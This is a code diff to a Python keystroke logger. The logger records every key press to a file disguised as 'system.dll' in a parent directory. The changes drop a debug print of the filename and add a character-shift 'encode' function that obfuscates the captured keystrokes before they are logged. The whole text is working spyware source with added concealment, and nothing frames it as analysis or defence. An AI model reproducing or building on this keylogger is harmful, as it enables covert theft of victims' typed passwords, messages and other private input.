@@ -5,13 +5,17 @@ import logging
 log_dir = '../'
 filename = 'system.dll'
 
-
-print(filename)
-
 buffer = ''
 
 logging.basicConfig(filename=(log_dir + filename),
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+def encode(str):
+    newStr = ''
+    for char in str:
+        newStr += chr(ord(char) + 1)
+    return newStr
 
 
 def on_keypress(key):
@@ -31,11 +35,11 @@ def on_keypress(key):
     elif key == Key.enter or key == Key.tab:
         if len(buffer) > 0:
             buffer += " Enter "
-            logging.info(buffer)
+            logging.info("&&&" + encode(buffer))
             buffer = ""
     elif key == Key.backspace:
         buffer += " BACKSPACE "
-        logging.info(buffer)
+        logging.info("&&&" + encode(buffer))
         buffer = ""
     else:
         # 4 because of the ctrl c/v/z/x stuff
